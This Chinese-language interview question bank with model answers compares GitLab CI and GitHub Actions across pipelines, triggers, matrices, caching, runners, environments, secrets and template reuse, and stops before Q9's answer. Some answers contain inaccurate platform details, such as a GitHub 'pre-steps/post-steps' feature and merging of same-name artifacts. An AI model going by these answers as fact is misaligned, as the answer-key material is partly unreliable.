# DevOps · GitLab CI / GitHub Actions（面试题库）

本文件考察候选人在现代托管 CI/CD 平台（GitLab CI 与 GitHub Actions）上的真实落地能力。以两平台对比视角覆盖流水线语法、触发器、缓存制品、Runner、环境部署、安全与选型，全部为场景化提问、不考八股文：重点看候选人能否在两个平台间自如迁移、说清各自的边界与取舍、引用线上排障与量化数据，难度从实践基础渐进到架构级。候选人不一定两平台都用过，但一个"只会背 YAML、不会讲原理"的人在这里会立刻露馅。

---

### Q1. 核心概念：GitLab Pipeline/Stage/Job 与 GitHub Workflow/Job/Step 到底差在哪？

**问题：** 你之前一直在 GitLab CI 上写 `.gitlab-ci.yml`，现在团队要迁到 GitHub Actions，让你先讲清楚两个平台的执行模型差异再动手。你会怎么对比 Pipeline/Stage/Job 和 Workflow/Job/Step？

**期望加分项：**
- 一句话概括：GitLab 是"三段式"（Pipeline→Stage→Job），GitHub 是"两层"（Workflow→Job，Job 内再分 Step），Stage 是 GitLab 的强制门闩、GitHub 没有原生 stage 概念
- 讲清 Stage 的语义价值：GitLab 同 Stage 内 Job 默认并行、不同 Stage 间默认串行等待，天然实现"阶段门禁"；GitHub 靠 `needs` 显式画依赖图，自由度更高但管控靠自觉
- Runner 对比：两边都叫 Runner，但 GitLab Runner 由你自己注册/托管（executor 支持 shell/docker/kubernetes），GitHub 分 GitHub-hosted（按分钟计费、自动伸缩）和 self-hosted
- 用真实迁移经验佐证：从"GitLab 的 stage 思维"到"GitHub 的 needs 思维"最常见的踩坑是忘记给 Job 加 `needs` 导致并行失控，或依赖了 GitLab 的隐式顺序
- 能指出 Step 是 GitHub 独有的执行粒度（同一 Job 内顺序执行、共享 shell 状态），GitLab 没有对应的 step 层级

**减分项：**
- 只会背"Pipeline 是 Stages 的集合"这类定义，说不出两平台的执行模型差异
- 不知道 GitLab 同 Stage 并行、GitHub 默认全并行要靠 needs 收敛
- 混淆 GitLab Runner 与 GitHub-hosted runner 的计费/管理模型
- 迁移时把 GitLab 的 stage 顺序假设直接搬进 GitHub，不检查 needs
- 无任何实践佐证，纯概念复述

**解答：**

核心差异在于"顺序靠什么保证"。GitLab 的执行模型是 Pipeline → Stage → Job：一个 Pipeline 含若干 Stage，Stage 之间默认严格串行（前一个 Stage 全部成功才进入下一个），同一 Stage 内的 Job 默认全部并行。这个模型把"阶段门禁"写进了平台本身，比如 `build` 没过，`test`、`deploy` 根本不会开始。GitHub Actions 是 Workflow → Job → Step：Workflow 由事件触发，Job 之间默认无任何顺序关系、全部并行，只有用 `needs` 显式声明依赖才形成 DAG；每个 Job 内再按顺序执行若干 Step，Step 之间共享同一工作目录和 shell 状态（比如 `npm ci` 装的依赖，后续 Step 直接可用），这点 GitLab 没有对应概念——GitLab Job 之间是相互隔离的，共享数据只能靠 artifacts 或 cache。所以两个平台的"翻译规则"是：GitLab 的一个 Stage 展开成 GitHub 的一组"被共同前置 Job `needs` 的 Job"，例如 GitLab 的 `stages: [build, test, deploy]` 到 GitHub 就是 `test` 里每个 Job 都写 `needs: build`。反方向迁移时，把 GitHub 的 needs 收束回 GitLab 的 stage 相对容易，但要注意 GitLab 的 artifacts 默认只在同 Pipeline 的后续 Stage 可见，跨 Pipeline（比如下游触发）必须显式配置。Runner 层面两边都叫 Runner，但 GitLab Runner 是独立安装的软件、由你注册到实例/组/项目并自选 executor（docker、shell、kubernetes），而 GitHub 的 hosted runner 由 GitHub 托管、按分钟计费，self-hosted runner 才是你自己维护的。我见过最典型的迁移事故：团队把 GitLab 里依赖 stage 隐式顺序的流水线平移到 GitHub，所有 Job 一拥而上，数据库迁移 Job 和测试 Job 同时跑，测试全红。

**延伸考点：** GitLab 的 `needs` 出现后，Stage 门禁还能不能保证？什么场景下你会故意不用 Stage 而改用 needs 构建 DAG？

---

### Q2. 配置语法：`.gitlab-ci.yml` 和 GitHub Actions 的 workflow 文件，关键字段怎么对应？

**问题：** 让你把一份 GitLab 流水线（含 stages、only/except、script、artifacts、variables）翻译成 GitHub Actions 的 `.github/workflows/*.yml`，你会怎么对照字段？两个文件的"心智模型"分别是什么？

**期望加分项：**
- 给出逐字段对照表：`stages`→`needs`+Job 划分、`script`→`run`、`variables`→`env`/`vars`、`only/except`→`if`+`on`、`artifacts`→`actions/upload-artifact`、`tags`→`runs-on`（self-hosted）
- 讲清根本差异：`.gitlab-ci.yml` 是"单文件描述整条流水线"、GitHub 是"一事件多 workflow 文件"，一个仓库可以挂几十个 workflow，各自独立触发
- 强调运行环境声明差异：GitHub 的 `runs-on: ubuntu-latest` 是 Job 级别强制声明（默认纯净 VM，镜像由 GitHub 维护），GitLab 默认在 Runner 上跑、用 `image:` 声明容器
- 指出 GitHub 的 Step 是 `uses`（复用现成 action）与 `run`（执行命令）混合体，GitLab 几乎全靠 `script` + 内置关键字，生态差异导致翻译工作量大
- 实践佐证：翻译时最大的坑是 GitLab 的全局 `default`/`variables` 作用域与 GitHub 的 `env`（job-level vs workflow-level）不一致，变量引用方式也不同（`$VAR` vs `${{ env.X }}`）

**减分项：**
- 只罗列关键字，说不清两个文件在"谁来保证顺序、谁来声明环境"上的设计差异
- 不知道 GitHub 是"多 workflow 文件 + 事件驱动"，把一切塞进一个文件
- 混淆 GitLab 的 `image` 与 GitHub 的 `runs-on`（前者是容器镜像、后者是虚拟机镜像标签）
- 变量语法混用（把 GitLab 的 `$VAR` 直接写进 `${{ }}` 上下文）
- 无实际翻译经验佐证

**解答：**

两个文件不是同构的。`.gitlab-ci.yml` 是"单文件 + 单流水线"：一个仓库一个文件，描述整条 CI/CD 链路，用 `stages` 定义阶段顺序。GitHub 是"多文件 + 事件驱动"：`.github/workflows/` 下可以放几十个 workflow，每个用 `on:` 声明触发事件，互不干扰——这是第一个要建立的认知，迁移时不要试图把一切都塞进一个文件。字段对照可以按"四类"记忆：一是执行顺序，GitLab `stages` → GitHub 用 Job 间 `needs` 显式画图；二是命令与上下文，GitLab 的 `script`（每个 Job 一个 script 数组） → GitHub 拆成多个带 `run` 的 Step，GitLab 的 `before_script`/`after_script` → `pre-steps`/`post-steps` 或把清理逻辑放进单独 Job（GitHub 没有全局 after_script，只有 Job 内 Step 和 `if: always()`）；三是环境声明，GitLab 靠 `image: node:20` 指定容器镜像（默认用 Runner 的 shell），GitHub 的 `runs-on: ubuntu-latest` 是 Job 级虚拟机镜像声明，`container:` 才能指定 Docker 镜像，两者不能混用；四是变量与制品，GitLab `variables:` → GitHub 的 `env:`（job 级或 workflow 级）或仓库 `vars`，引用方式 GitLab 是 shell 风格 `$MY_VAR`，GitHub 是模板语法 `${{ env.MY_VAR }}`，但 `run` 里仍可用 `$MY_VAR`（由 shell 展开），这就是最常见的混乱点。制品上 GitLab `artifacts:` → GitHub 用 `actions/upload-artifact` / `actions/download-artifact`，且 GitHub 的 artifact 默认只在同一 workflow run 内可下载（跨 workflow 要用 `workflow_run` 或 artifact 共享仓库）。另一个大差异是生态：GitHub 的 Step 可以 `uses: actions/checkout@v4` 复用社区 action，GitLab 没有等价物（最多用 `include` + 模板），所以"翻译"不是机械改关键字，而是要重新设计 Job 边界。实践上我会先画一张"Job 依赖图"，再决定 GitLab 侧压缩成几个 stage、GitHub 侧拆成几个 workflow。

**延伸考点：** GitHub 一个 PR 同时触发 lint 和 e2e 两个 workflow，如何保证它们不重复跑同一次构建？GitLab 的 `default:` 关键字在 GitHub 里用什么等价写法？

---

### Q3. 触发器与调度：push、MR/PR、tag、定时、手动触发，两边怎么配？

**问题：** 你们要支持：①开发分支 push 轻量校验；②合并到 main 时完整流水线；③打 tag 时发布；④每天凌晨跑全量回归；⑤生产发布必须人工点按钮。在 GitLab CI 和 GitHub Actions 上分别怎么实现？

**期望加分项：**
- 分事件类型说明：GitLab 靠 `rules:`（if/on_success/manual）单文件内分支调度，GitHub 靠 `on:` 事件块，且支持 `push/pull_request/tag/schedule/workflow_dispatch` 多事件混合
- 讲清两平台定时触发的差异：GitLab `schedule`（CI/CD → Schedules，可配 cron）默认跑在默认分支、可用 `variables` 注入；GitHub `schedule` 用 POSIX cron（仅 UTC，最小间隔 5 分钟、可能延迟），同样基于默认分支
- 手动触发对比：GitLab 用 `when: manual`（需用户点 Play，可带 `allow_failure`）；GitHub 用 `workflow_dispatch` 事件 + `inputs` 定义参数表单
- 强调 tag 触发注意点：GitLab `rules: if: $CI_COMMIT_TAG`，GitHub `on: push: tags: ['v*']`；常见坑是 tag 触发同时也会命中 push 规则导致双跑，要用分支过滤排除
- 实践佐证：schedule 流水线跑出来的环境"没有 PR 上下文"，很多工具（如依赖升级 bot）需要额外配置才拿得到正确 ref

**减分项：**
- 只答出 `on: [push, pull_request]`，说不出 tag、schedule、手动触发各场景
- 不知道 GitLab 的 `rules` 是"单 Job 级"判定，而 GitHub 的 `on` 是"整个 workflow 级"判定，混用概念
- 手动触发的参数化（GitHub `workflow_dispatch.inputs`）答不出来
- 忽略了 cron 的时区/延迟问题与默认分支语义
- tag 触发与 push 触发重复执行的边界处理缺失

**解答：**

先建立关键区别：GitLab 的触发判定粒度是 Job（每个 Job 用 `rules` 决定自己跑不跑），GitHub 的触发判定粒度是 Workflow（`on:` 决定整个文件跑不跑，Job 层面再用 `if` 细化）。一个典型的"轻量校验 + 完整流水线"设计：GitLab 里写 `rules: if: $CI_PIPELINE_SOURCE == "push" && $CI_COMMIT_BRANCH != "main"` 让大部分 Job 跳过，或用 `workflow: rules:` 在流水线级先过滤一次；GitHub 里拆成两个文件更干净——`on: push: branches-ignore: [main]` 的轻量 workflow 和 `on: push: branches: [main]` 的完整 workflow。tag 发布：GitLab `rules: if: $CI_COMMIT_TAG`（注意同时会触发 push 流水线，需要在 `workflow: rules` 里用 `$CI_PIPELINE_SOURCE == "push" && $CI_COMMIT_TAG` 排除），GitHub `on: push: tags: ['v*']` 天然只匹配 tag，且默认 checkout 的就是 tag ref。定时任务：GitLab CI/CD → Schedules 面板配 cron，Job 内用 `rules: if: $CI_PIPELINE_SOURCE == "schedule"` 拦截；GitHub `on: schedule: - cron: '0 2 * * *'`，注意它是 UTC、且 GitHub 官方明确"schedule 可能被延迟甚至跳过"，重要任务要配合失败告警。手动触发：GitLab `when: manual` + 在 GitLab UI 点 Play，常用 `allow_failure: false` 让"未点确认"的流水线保持阻塞状态（相当于门禁）；GitHub `on: workflow_dispatch:` + `inputs:` 定义下拉/文本框，配 `if: github.event.inputs.environment == 'prod'` 做分支。生产发布最稳妥的组合是"tag 自动构建 + 手动确认部署"：构建阶段 tag 触发全自动，deploy 阶段 `when: manual`（GitLab）或单独 deploy workflow 用 `workflow_dispatch`（GitHub），这样"谁在什么时候发布了什么"都有审计记录。实践坑：schedule 流水线的默认分支变了不会自动跟随，要回 Schedules 面板重新绑定。

**延伸考点：** GitHub 的 `schedule` 与 `workflow_dispatch` 同时定义时，怎么让手动触发能传参而定时触发用默认值？GitLab 的 `workflow: rules` 与 Job 级 `rules` 各自的职责边界？

---

### Q4. 矩阵构建：GitLab `parallel:matrix` 与 GitHub `strategy.matrix`，怎么设计测试矩阵？

**问题：** 一个跨平台 SDK 项目，要同时测 Node 18/20/22 × Linux/macOS/Windows × 是否带 legacy 依赖，共 18 种组合。你分别用 GitLab CI 和 GitHub Actions 怎么实现矩阵？怎么控制组合数？

**期望加分项：**
- 两边都能给出正确语法：GitLab `parallel: matrix:`（Job 内展开，含 `include`/`exclude` 语法）、GitHub `strategy: matrix:`（含 `include`/`exclude`，以及 `fail-fast`）
- 讲清语义差异：GitLab 的 matrix 是"一个 Job 展开成 N 个并行实例"，共享 stage 语义；GitHub 的 matrix 是"一个 Job 模板展开成 N 个 Job"，展开后每个有独立的 `matrix.<key>` 上下文
- 会用 `exclude`/`include` 裁剪：比如 Windows 上不跑 legacy 组合、只对特定版本跑集成测试，避免无意义组合浪费分钟数
- 有量化意识：说出展开后的 Job 总数、并发上限（GitLab Runner concurrency vs GitHub 并发 job 数限制/排队）、超时设置
- 知道失败处理差异：GitHub `fail-fast: false` 可让矩阵 Job 独立（跑完收集全部结果），GitLab 默认矩阵 Job 同 stage 并行、一个失败不影响其他但影响 stage 门禁
- 实践佐证：矩阵展开后 artifacts 命名冲突、覆盖率合并等真实坑

**减分项：**
- 只背 `strategy.matrix` 语法，不会用 exclude/include 控制组合爆炸
- 不知道 GitLab 也有 `parallel: matrix`，以为只有 GitHub 有矩阵
- 展开后 Job 数量失控、无并发/超时保护
- 忽略矩阵 Job 的产物/报告合并问题
- 无量化数据（组合数、耗时、成本）

**解答：**

矩阵的本质是"声明式展开"，两边语法高度相似。GitLab 在 Job 内写 `parallel: 18`（纯数量并行）或带变量展开 `parallel: matrix: - NODE_VERSION: ['18','20','22'] OS: ['linux','macos','windows'] LEGACY: ['true','false']`，它会生成 18 个该 Job 的并行实例，`$CI_NODE_INDEX` 等变量注入实例标识；GitHub 写 `strategy: matrix: node: [18, 20, 22] os: [ubuntu-latest, macos-latest, windows-latest] legacy: [true, false]`，生成 18 个 Job，Job 内通过 `${{ matrix.node }}` 取维度值。控制组合数是关键，两边都有 `exclude`（排除指定组合）和 `include`（追加组合），例如"Windows 不测 legacy"用 `exclude: - os: windows-latest legacy: true`。设计矩阵前先问三个问题：①哪些组合真的有产品意义（老版本 Node + 新 OS 组合往往没意义）；②哪些组合可以降级为"只在 Linux 上跑"；③冒烟与全量分开——冒烟矩阵只跑 2 个代表组合，PR 阶段全量矩阵跑在 merge 后。语义差异要讲清楚：GitLab 的 matrix 实例共享同一 Job 定义与 stage 门禁，一个实例失败会让整个 stage 失败、阻断后续 stage；GitHub 的矩阵 Job 是独立 Job，`fail-fast: false` 时失败的 Job 不影响其他 Job 继续跑，适合"我要收集全部失败"的场景，代价是耗时更长。产物方面，矩阵 Job 生成同名 artifact 会互相覆盖（GitHub 上 `actions/upload-artifact` 现在支持同名合并为 `name (index)`，但读取时要处理）；测试覆盖率报告要合并，GitLab 用 `coverage_report` 收集、GitHub 一般用第三方 action 汇总。还有两个常见的坑：GitHub 免费额度里 matrix 展开的并发 Job 受仓库级并发限制，排队长时要去 Actions 设置调 `concurrency`；GitLab 的 matrix 变量在 `artifacts: paths` 里做通配时容易踩变量展开的坑。

**延伸考点：** 矩阵里某个版本"构建失败但其余全过"，如何让这个 Job 失败不阻塞发布（白名单容忍）？两个平台的矩阵并发上限分别在哪一层控制？

---

### Q5. 缓存与制品：cache 与 artifacts 怎么分工？缓存键怎么设计？

**问题：** 你们流水线每次构建都全量装依赖，测试报错时又拿不到构建产物排查。你想把"依赖缓存"和"制品传递"都用起来，在 GitLab CI 和 GitHub Actions 上分别怎么做？

**期望加分项：**
- 讲清两平台都有的核心分工：cache（跨流水线复用的依赖，命中失效都允许）vs artifacts（流水线内 Job 间传递的产物，属于结果的一部分）
- 缓存键设计：GitLab 用 `key: files: [package-lock.json]`（锁文件 hash 做键）、GitHub 用 `actions/cache` + `key: ${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}`，配 `restore-keys` 部分命中兜底
- 讲清 GitLab cache 的目录语义（`paths` 相对工作目录、支持 `untracked`/`policy: pull-push`）与 GitHub actions/cache 的"路径 + 键"模型，以及 GitLab 15+ 的 cache 与 artifacts 的清理策略
- 强调边界：cache 不能当 artifact 用（可能命中旧内容），artifact 不能跨流水线用（默认），要跨流水线用 GitLab 的通用 artifact（`artifacts: expose_as` 或外部制品库）/ GitHub 的 `actions/upload-artifact` 配合 `workflow_run` 或共享仓库
- 实践佐证：缓存命中率量化（如从 12% 提到 85%，构建从 9 分钟降到 4 分钟）；缓存污染事故（锁文件变了但缓存键没变）

**减分项：**
- 把 cache 和 artifacts 混为一谈，说不清"依赖复用"与"产物传递"的差异
- 缓存键用时间戳或分支名，命中率极低
- 不知道缓存失效与清理策略（GitHub cache 有 10GB/仓库上限，GitLab 有 storage 配额）
- 忽略了"缓存内容平台无关性"（Windows 与 Linux 的 node_modules 不能混用缓存）
- 无量化数据支撑

**解答：**

一句话分清：cache 是"性能优化"，丢了重装就行；artifacts 是"流水线语义的一部分"，Job 之间传递、最终归档。依赖缓存：GitLab 在 Job 里写 `cache: key: files: [package-lock.json] paths: [node_modules/] policy: pull-push`，`key: files:` 的意思是"锁文件 hash 变化才换缓存键"，命中率的关键就在这；GitHub 用 `actions/cache@v4`，标准写法是 `key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}` + `restore-keys: ${{ runner.os }}-npm-`（前缀部分命中兜底），缓存存到 GitHub 的 10GB/仓库 的配额里，超限按 LRU 淘汰。GitHub 自带的 `actions/setup-node` 有内置的 npm/yarn 缓存开关（`cache: npm`），能少写一个 action。制品传递：GitLab 的 `artifacts: paths: [dist/]` 自动在同 Pipeline 后续 Stage 可用（`dependencies` 可指定只拿某个 Job 的制品），还支持 `expire_in` 控制归档时长；GitHub 必须显式 `actions/upload-artifact` + 在需要的 Job `actions/download-artifact`（默认只在本 workflow run 内有效，跨 workflow 要用 `workflow_run` 事件或 artifact 仓库）。设计原则：①cache 键必须绑定"影响依赖内容的文件"（package-lock.json/pom.xml/requirements.txt），否则缓存就是定时炸弹——我经历过锁文件升级了、键没变、CI 用旧依赖构建出对不上代码的产物的线上事故；②跨平台要按 OS 分键，`node_modules` 里可能有原生模块，Linux 的缓存给 Windows 用直接报错；③大依赖（如前端构建缓存 webpack cache）可以考虑存到外部对象存储/Artifactory 而不是平台 cache，避免配额和"每 Runner 冷缓存"问题；④artifact 策略：构建一次、处处部署——dist/ 上传后在 deploy Job 只拉不建，保证生产跑的和你验证的是同一个包。

**延伸考点：** GitHub cache 命中时如何验证"缓存内容与当前锁文件一致"？GitLab 的 `cache` 跨 Runner 共享需要什么前提（分布式缓存存储）？

---

### Q6. Runner 管理：GitLab Runner 与 GitHub self-hosted runner，注册、标签、伸缩怎么做？

**问题：** 你们 CI 上有几个 Job 需要内网访问数据库和 K8s 集群，托管 Runner 跑不了；同时高峰期并发不够、低峰期空转浪费钱。你打算引入自建 Runner，GitLab 和 GitHub 的 self-hosted 方案分别怎么搭？怎么管理标签与自动伸缩？

**期望加分项：**
- 讲清 GitLab Runner 的完整体系：shared/group/project 三级注册（`gitlab-runner register` 拿 token）、executor 选择（shell/docker/docker+machine/kubernetes）、`tags` 在 Job 与 Runner 间匹配
- 讲清 GitHub self-hosted runner：仓库级/组织级注册、runner 组（groups）限权、标签（`labels`）匹配 `runs-on`，官方支持按比例缩放（autoscaling）配置
- 对比伸缩方案：GitLab 用 `docker+machine`/`autoscaler`（或 k8s executor + HPA），GitHub 用 `actions-runner-controller`（ARC）在 Kubernetes 上按队列长度扩缩
- 强调安全边界：self-hosted runner 跑不可信 PR 代码是最大的风险（见 Q15），GitLab 用 `protected` runner + `protected branches` 限制、GitHub 用 runner group 的 `can_public_repositories_access` 控制
- 实践佐证：调度策略（Job 排队时长、扩缩阈值）、成本数据（按需实例 vs 常驻实例的费用对比）

**减分项：**
- 只知道 `gitlab-runner register` 这一条命令，说不清 executor 差异与适用场景
- 不知道 GitHub self-hosted runner 有"runner group + 标签"两层管控
- 无自动伸缩方案，回答停留在"手动加机器"
- 把 self-hosted runner 直接暴露给不可信代码（PR 任意分支都能调度）
- 无并发/成本量化

**解答：**

两边 runner 的"注册-打标-调度"模型几乎一样，差别在托管生态。GitLab：安装 `gitlab-runner` 软件后 `gitlab-runner register`（填入 GitLab 实例 URL + 注册 token），token 分三种注册范围——shared（全实例）、group（组内项目共享）、project（单项目），按预算和隔离要求选；executor 决定"Job 跑在哪"，常见四种：`shell`（直接在本机执行，最省事但环境脏）、`docker`（每 Job 起容器，隔离好，最常用）、`docker+machine`/`autoscaler`（按需创建云主机跑 Job，支持弹性伸缩）、`kubernetes`（k8s 集群内跑 Pod，用 HPA/队列长度扩缩）。调度靠标签：Job 写 `tags: [gpu, k8s]`，只有带这些标签的 Runner 会被选上，这是"内网 Job"的正确解法——给能访问内网的 Runner 打 `internal` 标签，普通 Job 不匹配自然跑不到它。GitHub：在 Settings → Actions → Runners 注册 self-hosted runner（拿 token），runner 属于组织级或仓库级，再归入 runner group 控制谁能用；标签同样用于 `runs-on: [self-hosted, linux, x64, internal]` 匹配。伸缩：GitLab 中小团队常用常驻 2-3 台 + 高峰期手动加，上量后用 kubernetes executor 让 Job 按队列自动起 Pod；GitHub 官方推荐 `actions-runner-controller`（ARC），部署到自有集群，监听仓库的 job 队列，待运行数超过阈值就横向扩容 runner Pod，空闲缩容。成本对比常见结论：常驻 4 核实例约 24h × N 台跑满，按需伸缩大约省 40-60% 空闲成本，但要多维护一个控制平面（ARC/autoscaler）。安全永远是第一前提：self-hosted runner 上绝不能默认跑 fork 的 PR 代码（见 Q15），GitLab 侧把关键 Runner 设为 `protected` 并要求只有 protected 分支/受信 Job 能调度，GitHub 侧在 runner group 里关闭"允许 public fork 访问"。

**延伸考点：** 自建 Runner 上同时跑着 dev 环境和构建任务，你会怎么隔离？Runner 版本升级与标签维护有什么自动化做法？

---

### Q7. 环境与部署：GitLab environments 与 GitHub environments，保护环境、审批怎么用？

**问题：** 你们现在的"生产部署"就是流水线里最后一个 Job 直接 `kubectl apply`，没有审批、没有环境记录、出了事不知道是谁部署的。用 GitLab environments 或 GitHub environments 怎么把它管起来？

**期望加分项：**
- 讲清两边同名但实现有差异的 environments 概念：GitLab `environment: name: production`（部署记录自动进 Environments 页，可回滚）、GitHub `environment: production`（在仓库 Settings 里创建，绑定保护规则）
- 部署审批对比：GitLab 用"手动 Job（`when: manual`）+ 环境级批准规则（需要 N 个 maintainer 批准）"，GitHub 用 environments 的 `required reviewers`（保护环境 + 审批人名单）
- 强调 GitHub environment 的独特能力：environment secrets（环境级密钥，见 Q8）、部署分支限制（`deployment_branch` 只允许 main）、审批与等待队列
- 部署回滚与历史：GitLab Environments 页直接"Rollback"到上一个部署记录，GitHub 用 `deployment` API/动作重建；部署状态通过 GitHub 的 deployment status 反馈到 PR 上
- 实践佐证：生产审批流如何与值班表/IM 通知集成、回滚演练

**减分项：**
- 把 environments 当"普通标签"用，不知道它承载部署历史、回滚、审批能力
- 不知道 GitHub 的 environment 是仓库 Settings 里的"一等公民"（有独立密钥与审批规则）
- 生产部署无任何审批/分支限制，违背"零信任"原则
- 回滚靠手动重跑流水线而不是基于部署记录
- 无环境隔离（dev/staging/prod 共用一个环境定义）的坑的认知

**解答：**

先纠正一个常见误解：environments 不是装饰性的名字，它承载"部署历史 + 回滚 + 审批"三个能力。GitLab 侧，部署 Job 写 `environment: name: production url: https://prod.example.com`，每次部署自动生成一条 Environment 记录（含 commit、时间、操作者），Environments 页面上可以一键 Rollback 到之前的 deployment——回滚的本质是"重新部署上一次的制品"，所以 Q1 的"构建一次"原则在这里再次体现：制品不可变，回滚才有意义。GitLab 的审批用"手动 Job 做闸门"：deploy 设 `when: manual`，谁点谁负责，再配合环境级"Approvals"规则（需要 2 个 maintainer 批准才能点 Play），或者更现代的做法是在生产环境的 Settings → Deployments 里配置批准规则。GitHub 侧，environment 在仓库 Settings → Environments 创建，功能明显更重：①required reviewers——生产部署必须经过指定成员/team 审批，PR 里会显示 deployment 等待审批的状态；②environment secrets——每个环境有独立的密钥集（dev 用 dev 的 key，prod 用 prod 的 key，防止 dev 泄露拖垮 prod）；③deployment branches——限制只有特定分支能部署到该环境（`environment: production` + 分支规则）。使用方式是在 Job 里声明 `environment: production`，部署 Job 默认自动获取环境锁；GitHub 还支持 deployment concurrency（同一环境同时只有一个部署进行中，新部署排队）。实践建议：把"部署"拆成两层——"发布构建"（非受保护，任何 PR 合并都能触发）与"环境部署"（受保护环境 + 审批），用 `if: github.ref == 'refs/heads/main'` + 环境保护规则双重约束。回滚实践：GitLab 直接点 Rollback 按钮；GitHub 没有原生 rollback 按钮，通常做法是记录每次 deployment 的 SHA（`sha` 上下文）或制品 tag，回滚 = 触发一个 `workflow_dispatch` 部署指定旧版本。我见过最惨的事故：把 staging 和 production 合并成一个 environment 定义，部署脚本又没做环境参数化，一条流水线把 staging 的配置推到了生产。

**延伸考点：** GitHub 的 environment 保护规则里"等待部署队列"与"并发部署"是什么语义？GitLab 环境名里用 `name: review/$CI_COMMIT_REF_SLUG` 动态创建 review 环境，回滚策略怎么设计？

---

### Q8. 密钥管理：GitLab CI/CD Variables 与 GitHub Secrets，掩码、保护、环境级怎么配？

**问题：** 你们把生产数据库密码直接写在 `.gitlab-ci.yml` 里被扫出来了。要建立一套"密钥管理规范"，GitLab 和 GitHub 分别支持哪些密钥机制？masked、protected、environment secrets 分别解决什么问题？

**期望加分项：**
- 讲清两平台密钥入口：GitLab 项目/组/实例 Settings → CI/CD → Variables，GitHub 仓库/组织 Settings → Secrets and variables → Actions
- 区分 GitLab 变量四种属性：Protected（仅 protected 分支/tag 可用）、Masked（日志脱敏，8 位以上且不能是普通字符）、Expanded（支持变量嵌套展开）、File（把密钥写成文件挂载）
- 区分 GitHub Secrets 的两类：加密存储的 secrets（Actions 里 `${{ secrets.X }}` 引用，日志自动脱敏）、environment secrets（绑定到特定 environment，配合保护环境只在对应部署 Job 可用）；另有非加密的 `vars` 用于公开配置
- 强调写入时机的差异：GitLab 变量在 Job 里直接是环境变量，GitHub 必须显式在 Step/Job 的 `env:` 里映射 `${{ secrets.X }}`，这是"泄露源"最常见的坑
- 实践佐证：日志泄露事故处理（立即 revoke + 轮换 + 全库扫描）、masked 的局限性（不等于不泄露，Job 结束后日志仍可能带出）

**减分项：**
- 只答"把密码放 CI 变量"，说不出 masked/protected/环境级各自的防护面
- 不知道 GitHub 的 secrets 不经过显式 `env:` 映射就不会自动注入（以为声明了就生效）
- 把非加密的 `vars` 与加密的 `secrets` 混为一谈
- 密钥轮换、泄露响应流程缺失
- 无事故佐证

**解答：**

先给结论：两平台都是"平台侧托管 + 流水线侧注入"，但注入方式不同，这是最多事故的地方。GitLab：项目 Settings → CI/CD → Variables，新增变量时打四个开关——`Protected`（只有 protected 分支/tag 的流水线能读到，防止 feature 分支随意用生产密钥）、`Masked`（日志中出现该值时自动替换为 `[MASKED]`，要求值 8 位以上且不含普通单词）、`Expanded`（值里可用 `$VAR` 嵌套引用其他变量）、`File`（把值写成文件路径变量，适合证书/SA 文件）。GitLab 的变量对 Job 是"自动注入为环境变量"，直接 `echo $DB_PASSWORD` 就能用，方便但也容易无意识泄露。GitHub：仓库/组织 Settings → Secrets and variables → Actions，Secrets 与 Variables 两类分开：`secrets` 加密存储、UI 上不可见、日志中自动脱敏，引用必须显式映射——在 Job/Step 写 `env: DB_PASSWORD: ${{ secrets.DB_PASSWORD }}` 或直接在 `run` 里 `${{ secrets.DB_PASSWORD }}`，不映射就不会注入，这条规则的双面性是：安全（不会自动进环境）也易错（忘了映射导致 Job 里取不到值，新手常在这翻车）；`vars` 是明文的公开配置（如版本号、开关位），任何有写权限的人可见。environment secrets 是 GitHub 的杀器：在 environment（Q7）里定义的密钥只在"部署到该环境"的 Job 里可用，配合 required reviewers 实现"生产密钥只在审批通过的部署里现身"。GitLab 的等价物是"环境作用域变量"（Variable 的 environment_scope），但用得不如 GitHub 顺。实践规范建议：①密钥永不进仓库文件，用平台机制注入；②按环境/按项目分级，生产密钥一律 `protected`，能不用 `masked` 兜底就不依赖它——masked 只挡"日志里出现"，挡不住 `curl` 到外部服务器这类主动外带；③轮换与响应：GitLab 支持 API 一键删除变量，泄露流程 = 立即 revoke → 改密码/换 key → 全仓 `gitleaks`/`trufflehog` 扫描历史 commit → 考虑把密钥迁移到 Vault（GitLab 有原生 `vault` 关键字集成）或云 KMS（GitHub 无原生，用第三方 action 或从 secrets 中引用托管密钥 ID）。

**延伸考点：** 如何在流水线里判断一个密钥变量"是否已配置"，避免 Job 因缺变量而静默用空值？密钥需要"只在特定 Job 暴露给特定工具"，GitHub 的 `env` 作用域怎么做到最小暴露？

---

### Q9. 模板与复用：GitLab include/template 与 GitHub composite action/reusable workflow，怎么避免流水线复制粘贴？

**问题：** 你们 40 个仓库的流水线是复制粘贴的，改了构建步骤要全量通知大家手动同步，还经常出现有的仓库改了、有的没改。用 GitLab 和 GitHub 的复用机制分别怎么收敛？

**期望加分项：**
- 讲清 GitLab 三级复用：`include`（local/project/remote/template 四种来源）、`extends`（Job 继承覆盖）、模板仓库（`.gitlab-ci` template 分享）；推荐用"中心化模板仓库 + include: project + ref"锁定版本
- 讲清 GitHub 两种复用：composite action（复用 Step 序列，`uses: ./path` 或 `org/repo@v1`，接收 inputs）、reusable workflow（复用整个 Job/Workflow，`uses: org/repo/.github/workflows/x.yml@v1`，用 `on: workflow_call` 声明）
- 讲清边界：composite action 适合"一段固定命令"（如 setup、构建、告警），reusable workflow 适合"整套 Job 编排"（如"标准 CI 模板"），GitLab 的 include 是"文本级拼接"，extends 是"对象级继承"，三者心智模型完全不同
- 版本控制：GitLab `include: project: ... ref: v1.2.0` 锁定模板版本，GitHub reusable workflow 用 tag 引用；升级策略（灰度一个仓库试用新模板版本）
- 实践佐证：把 40 个仓库的重复流水线收敛到一个模板后，变更从"周级"降到"分钟级"，同时讲清"模板过度抽象"的坑（参数爆炸、难调试）

**减分项：**
- 只知道 `include` 一个关键字，说不清 extends、template 的各自职责
- 把 GitHub 的 composite action 与 reusable workflow 混为一谈
- 复用用默认分支 ref，模板一变全公司流水线一起炸（无版本锁定）
- 模板抽象过度，参数几十个，维护者自己都改不动
- 无实际收敛案例（仓库数量、变更效率）佐证

**解答：**

